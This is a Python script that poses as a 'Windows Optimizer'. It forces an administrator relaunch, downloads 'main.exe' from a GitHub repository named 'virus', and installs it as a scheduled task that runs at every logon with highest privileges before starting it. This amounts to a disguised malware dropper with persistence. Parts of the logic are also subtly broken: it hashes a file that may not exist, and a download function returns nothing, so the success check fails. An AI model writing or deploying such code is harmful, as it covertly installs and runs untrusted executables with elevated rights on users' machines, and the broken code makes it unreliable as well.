import os
import sys
import ctypes
import subprocess
import hashlib
import requests
from tqdm import tqdm

TASK_NAME = "Optimizer"
APP_NAME = "main.exe"
DOWNLOAD_URL = "https://github.com/aslskks/virus/raw/refs/heads/main/"


# -----------------------
# Admin check
# -----------------------
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def relaunch_as_admin():
    params = " ".join([f'"{arg}"' for arg in sys.argv])
    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        params,
        None,
        1
    )
    sys.exit()


def ensure_admin():
    if not is_admin():
        relaunch_as_admin()


# -----------------------
# Download EXE
# -----------------------
def download_with_progress(url, output):
    response = requests.get(url, stream=True)
    response.raise_for_status()

    total_size = int(response.headers.get("content-length", 0))

    with open(output, "wb") as f, tqdm(
        total=total_size,
        unit="B",
        unit_scale=True,
        desc="Downloading"
    ) as bar:

        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)
                bar.update(len(chunk))



# -----------------------
# Create startup task
# -----------------------
def create_startup_task(exe_path):
    cmd = [
        "schtasks",
        "/create",
        "/tn", TASK_NAME,
        "/tr", f'"{exe_path}"',
        "/sc", "ONLOGON",
        "/rl", "HIGHEST",
        "/f"
    ]
    #schtasks /create /tn Optimizer /tr "main.exe" /sc ONLOGON /rl HIGHEST /f

    result = subprocess.run(cmd, capture_output=True, text=True)

# -----------------------
# Main
# -----------------------
def download_exe(url, app_name):
    try:
        with requests.get(url, stream=True, timeout=10) as response:
            response.raise_for_status()

            with open(app_name, "wb") as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)

        return True

    except requests.RequestException as e:
        print(f"Error descargando archivo: {e}")
        return False
def hash_file(path, algorithm="sha256", chunk_size=1024 * 1024):  # 1 MB chunks
    hasher = hashlib.new(algorithm)
    
    with open(path, "rb") as f:
        while chunk := f.read(chunk_size):
            hasher.update(chunk)
    
    return hasher.hexdigest()
def main():
    if not is_admin():
        relaunch_as_admin()
    print("Hello welcome to the Windows Optimizer")
    res = input("Want to continue (yes, no): ")
    if res == "no":
        sys.exit()
    exe_path = os.path.abspath(APP_NAME)
    hasha = hash_file("main.exe")
    if os.path.exists("hash.txt"):
        os.remove("hash.txt")
    download_with_progress(DOWNLOAD_URL + "hash.txt", "hash.txt")
    with open("hash.txt") as file:
        hash_txt = file.read()
    hash_proved = True if hasha == hash_txt else False
    if not os.path.exists(exe_path) or not hash_proved:
        ok = download_with_progress(DOWNLOAD_URL + "main.exe", APP_NAME)
        if not ok:
            return

    create_startup_task(exe_path)
    result = os.system("schtasks /run /tn Optimizer")


if __name__ == "__main__":
    main()